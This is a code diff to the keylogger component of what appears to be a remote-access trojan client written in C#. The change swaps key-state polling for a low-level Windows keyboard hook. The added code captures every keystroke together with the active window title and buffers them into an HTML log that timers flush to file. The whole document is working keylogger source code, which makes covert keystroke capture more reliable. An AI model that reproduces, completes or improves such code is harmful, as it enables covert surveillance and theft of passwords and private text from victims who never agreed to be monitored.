@@ -1,11 +1,9 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.Runtime.InteropServices;
 using System.Text;
-using System.Threading;
 using System.Windows.Forms;
-using xClient.Core.Keylogger;
+using System.Diagnostics;
 
 namespace xClient.Core.Keylogger
 {
@@ -13,13 +11,11 @@ namespace xClient.Core.Keylogger
     {
         public static Logger Instance;
 
+        private bool IsEnabled = false;
         public bool Enabled
         {
-            get { return _timerLogKeys.Enabled && _timerFlush.Enabled && _timerEmptyKeyBuffer.Enabled; }
-            set
-            {
-                _timerLogKeys.Enabled = _timerFlush.Enabled = _timerEmptyKeyBuffer.Enabled = value;
-            }
+            get { return this.IsEnabled; }
+            set { SetHook(value); }
         }
 
         private StringBuilder _logFileBuffer;
@@ -31,15 +27,34 @@ namespace xClient.Core.Keylogger
 
         private readonly KeyloggerKeys[] _allKeys;
         private readonly KeyloggerKeys[] _specialKeys;
+        private readonly List<KeyloggerKeys> _keysDown = new List<KeyloggerKeys>();
         private volatile List<LoggedKey> _keyBuffer;
-        private readonly System.Timers.Timer _timerLogKeys;
         private readonly System.Timers.Timer _timerEmptyKeyBuffer;
         private readonly System.Timers.Timer _timerFlush;
+
+        public struct KeyData
+        {
+            public int vkCode;
+            public int scanCode;
+            public int flags;
+            public int time;
+            public int dwExtraInfo;
+        }
+
+        private const int WM_KEYDOWN = 0x100;
+        private const int WM_KEYUP = 0x101;
+        private const int WM_SYSKEYDOWN = 0x104;
+        private const int WM_SYSKEYUP = 0x105;
+        private const int WH_KEYBOARD_LL = 13;
+
+        public delegate int HookProcDelegate(int nCode, int wParam, ref KeyData lParam);
+        private HookProcDelegate _hook;
+
+        private IntPtr _hookHandle;
 
         /// <summary>
         /// Creates the logging class that provides keylogging functionality.
         /// </summary>
-        /// <param name="flushInterval">The interval, in milliseconds, to flush the contents of the keylogger to the file.</param>
         public Logger(double flushInterval)
         {
             Instance = this;
@@ -51,9 +66,6 @@ namespace xClient.Core.Keylogger
             _specialKeys = GetSpecialKeys();
 
             _keyBuffer = new List<LoggedKey>();
-
-            this._timerLogKeys = new System.Timers.Timer { Enabled = false, Interval = 10 };
-            this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;
 
             this._timerEmptyKeyBuffer = new System.Timers.Timer { Enabled = false, Interval = 500 };
             this._timerEmptyKeyBuffer.Elapsed += this.timerEmptyKeyBuffer_Elapsed;
@@ -137,6 +149,76 @@ namespace xClient.Core.Keylogger
             }
         }
 
+        private int HookProc(int nCode, int wParam, ref KeyData lParam)
+        {
+            if (nCode >= 0)
+            {
+                KeyloggerKeys key = (KeyloggerKeys) lParam.vkCode;
+
+                if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+                {
+                    _keysDown.RemoveAll(k => k == key);
+                }
+
+                if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+                {
+                    if (!_keysDown.Contains(key))
+                    {
+                        try
+                        {
+                            LoggedKey KeyToLog = new LoggedKey()
+                            {
+                                PressedKey = key
+                            };
+                            KeyToLog.RecordModifierKeys();
+
+                            _keyBuffer.Add(KeyToLog);
+                            _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
+
+                            if (!string.IsNullOrEmpty(_hWndTitle))
+                            {
+                                // Only write the title to the log file if the names are different.
+                                if (_hWndTitle != _hWndLastTitle)
+                                {
+                                    _hWndLastTitle = _hWndTitle;
+                                    _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
+                                }
+                            }
+                        }
+                        catch
+                        {
+                        }
+
+                        _keysDown.Add(key);
+                    }
+                }
+            }
+
+            return Win32.CallNextHookEx(_hookHandle, nCode, wParam, ref lParam);
+        }
+
+        private void SetHook(bool enable)
+        {
+            switch (enable)
+            {
+                case true:
+                    _hook = new HookProcDelegate(HookProc);
+                    _hookHandle = Win32.SetWindowsHookEx(WH_KEYBOARD_LL, _hook, Win32.GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);
+                    //hook installed, enabled
+                    _timerFlush.Enabled = true;
+                    _timerEmptyKeyBuffer.Enabled = true;
+                    IsEnabled = true;
+                    Application.Run();
+                    Win32.UnhookWindowsHookEx(_hookHandle);
+                    break;
+                case false:
+                    _timerFlush.Enabled = false;
+                    _timerEmptyKeyBuffer.Enabled = false;
+                    Application.ExitThread();
+                    break;
+            }
+        }
+
         private void timerEmptyKeyBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
             int j = 0;
@@ -205,40 +287,6 @@ namespace xClient.Core.Keylogger
                 }
                 catch
                 { }
-            }
-        }
-
-        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
-        {
-            // Loop through each value in the array of keys to record.
-            foreach (byte i in _allKeys)
-            {
-                // GetAsycKeyState returns the result by setting the most significant
-                // bit if the key is up, and sets the least significant bit if the
-                // key was pressed.
-                if (Win32.GetAsyncKeyState(i) == -32767)
-                {
-                    try
-                    {
-                        LoggedKey KeyToLog = new LoggedKey() { PressedKey = (KeyloggerKeys)i };
-                        KeyToLog.RecordModifierKeys();
-
-                        _keyBuffer.Add(KeyToLog);
-                        _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
-
-                        if (!string.IsNullOrEmpty(_hWndTitle))
-                        {
-                            // Only write the title to the log file if the names are different.
-                            if (_hWndTitle != _hWndLastTitle)
-                            {
-                                _hWndLastTitle = _hWndTitle;
-                                _logFileBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
-                            }
-                        }
-                    }
-                    catch
-                    { }
-                }
             }
         }
 
@@ -318,14 +366,23 @@ namespace xClient.Core.Keylogger
             //The keys we are interested in are modifier keys such as shift and caps lock
             byte[] keyStates = new byte[256];
 
-            keyStates[(int)KeyloggerKeys.VK_SHIFT] = (key.ModifierKeys.ShiftKeyPressed && AllowCapitalization) ? (byte)128 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_CAPITAL] = (key.ModifierKeys.CapsLock && AllowCapitalization) ? (byte)128 : (byte)0;
+            if (key.ModifierKeys.ShiftKeyPressed && AllowCapitalization)
+                keyStates[(int)KeyloggerKeys.VK_SHIFT] = 0x80;
 
-            keyStates[(int)KeyloggerKeys.VK_MENU] = key.ModifierKeys.CtrlKeyPressed ? (byte)128 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_CONTROL] = key.ModifierKeys.AltKeyPressed ? (byte)128 : (byte)0;
+            if (key.ModifierKeys.CtrlKeyPressed)
+                keyStates[(int)KeyloggerKeys.VK_CONTROL] = 0x80;
 
-            keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = key.ModifierKeys.NumLock ? (byte)128 : (byte)0;
-            keyStates[(int)KeyloggerKeys.VK_SCROLL] = key.ModifierKeys.ScrollLock ? (byte)128 : (byte)0;
+            if (key.ModifierKeys.AltKeyPressed)
+                keyStates[(int)KeyloggerKeys.VK_MENU] = 0x80;
+
+            if (key.ModifierKeys.CapsLock && AllowCapitalization)
+                keyStates[(int)KeyloggerKeys.VK_CAPITAL] = 0x01;
+
+            if (key.ModifierKeys.NumLock)
+                keyStates[(int)KeyloggerKeys.VK_NUMLOCK] = 0x01;
+
+            if (key.ModifierKeys.ScrollLock)
+                keyStates[(int)KeyloggerKeys.VK_SCROLL] = 0x01;
 
             var sb = new StringBuilder(10);
 
